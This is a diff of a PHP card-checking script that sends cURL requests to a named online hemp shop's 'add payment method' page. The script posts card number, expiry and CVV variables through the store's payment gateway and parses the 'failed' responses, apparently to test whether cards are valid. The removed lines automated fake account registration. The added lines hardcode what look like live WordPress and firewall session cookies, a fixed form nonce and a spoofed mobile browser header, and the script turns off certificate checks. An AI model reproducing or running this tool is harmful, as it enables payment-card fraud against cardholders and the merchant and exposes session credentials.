@@ -1478,97 +1478,37 @@ curl_close($ch);
 
 
 
+$headers = array();
+$headers[] = "Host:www.warfighterhemp.com";
+$headers[] = "cache-control: max-age=0";
+$headers[] = "upgrade-insecure-requests: 1";
+$headers[] = "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36";
+$headers[] = "referer: https://www.warfighterhemp.com/my-account/add-payment-method/";
+$headers[] = "cookie: PHPSESSID=212fbc15f71bcc4c6523856b55168a5d";
+$headers[] = "cookie: sbjs_migrations=1418474375998%3D1";
+$headers[] = "cookie: sbjs_current_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
+$headers[] = "cookie: sbjs_first_add=fd%3D2024-09-01%2002%3A33%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29";
+$headers[] = "cookie: sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
+$headers[] = "cookie: sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29";
+$headers[] = "cookie: sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36";
+$headers[] = "cookie: lepopup-onload-WFH-Age-Verification=ilovefamily";
+$headers[] = "cookie: undefined=hidden";
+$headers[] = "cookie: wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=gopejob932%7C1726371315%7CxKjbMc5CqommL6NpUYvaxW2XinH9aH8T3oBhkO0VEn2%7Cfc6213f501ed59e619311b5374589b256f79c09b60acbe170c0bddd8f2468dcc";
+$headers[] = "cookie: wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5553%7Cother%7Cread%7Cbbb2aaec203845433e4024dc542fe29c176ed4fe9b73c69eee1a8d24edce7b3c";
+$headers[] = "cookie: sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F";
+
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/my-account/add-payment-method/');
+curl_setopt($ch, CURLOPT_URL, "https://www.warfighterhemp.com/my-account/add-payment-method/");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-
-$response = curl_exec($ch);
-
-/*
-$nonce1 = '';
-if(preg_match('/<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^"]+)"/', $response, $matches)) {
-    $nonce1 = $matches[1];
-}
-echo "nonce1: $nonce1\n";
-
-curl_close($ch);
-*/
-    // Captura el nonce desde la respuesta usando una expresión regular
-    preg_match('/<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^"]+)"/', $response, $matches);
-    $nonce1 = isset($matches[1]) ? $matches[1] : null;
-
-// echo "nonce1: $nonce1\n";
-
-// Cierra la sesión cURL para liberar recursos
-curl_close($ch);
-
-
-//$correo = "rigor12@gmail.com";
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/create-account/');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36');
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$correo.'&password=CanaryFreeSktd828&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F&wc_order_attribution_session_start_time='.date('Y-m-d') . '+' . urlencode(date('H:i:s')).'&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F127.0.0.0+Safari%2F537.36&srp_birthday_date=1999-05-02&woocommerce-register-nonce='.$nonce1.'&_wp_http_referer=%2Fcreate-account%2F&register=Register');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-
-$response = curl_exec($ch);
-curl_close($ch);
-
-
-
-
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/my-account/add-payment-method/');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-
-// Realiza la solicitud
-$response = curl_exec($ch);
-
-// Captura el nonce
-preg_match('/<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="(.*?)" \/>/', $response, $matches);
-$nonce2 = $matches[1] ?? null;
-
-// Cierra la conexión
-curl_close($ch);
-
-//echo "nonce2 $nonce2\n";
-
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.warfighterhemp.com/my-account/add-payment-method/');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce=9c4b4d45c8&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
 $response = curl_exec($ch);
 
@@ -1578,8 +1518,6 @@ $patron = "/failed: (.*)/";
 preg_match($patron, $result1, $matches);
 $respo = $matches[1];
 
-
-//echo "RESULT: $result1 | $respo\n";
 curl_close($ch);
 
 
